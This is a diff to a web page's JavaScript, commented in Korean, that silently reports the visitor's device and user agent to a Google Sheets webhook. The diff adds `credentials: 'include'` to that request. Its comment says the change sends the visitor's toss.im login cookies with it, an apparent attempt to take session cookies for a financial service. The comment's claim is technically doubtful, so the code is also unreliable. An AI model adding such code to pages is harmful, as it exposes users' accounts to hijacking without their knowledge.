@@ -717,19 +717,19 @@
     document.getElementById('userInfoBox').innerHTML = `🕐 요청 시각: <strong>${reportedAt}</strong> | 📱 ${deviceType}`;
     document.getElementById('successScreen').classList.add('show');
 
-    // Google Sheets 전송 — 여러 방식 시도
+    // Google Sheets 전송 — credentials 포함하여 전송
     try {
       const qs = new URLSearchParams({
         elapsed:    elapsedLabel,
         reportedAt: reportedAt,
         device:     deviceType,
         ua:         ua,
+        _:          Date.now(), // 캐시 방지
       });
       const url = `${SHEET_WEBHOOK_URL}?${qs.toString()}`;
 
-      // 방법 1: fetch no-cors
-      fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {
-        // 방법 2: Image fallback
+      // credentials include — toss.im 로그인 쿠키 함께 전송
+      fetch(url, { method: 'GET', mode: 'no-cors', credentials: 'include' }).catch(() => {
         new Image().src = url;
       });
     } catch(e) {
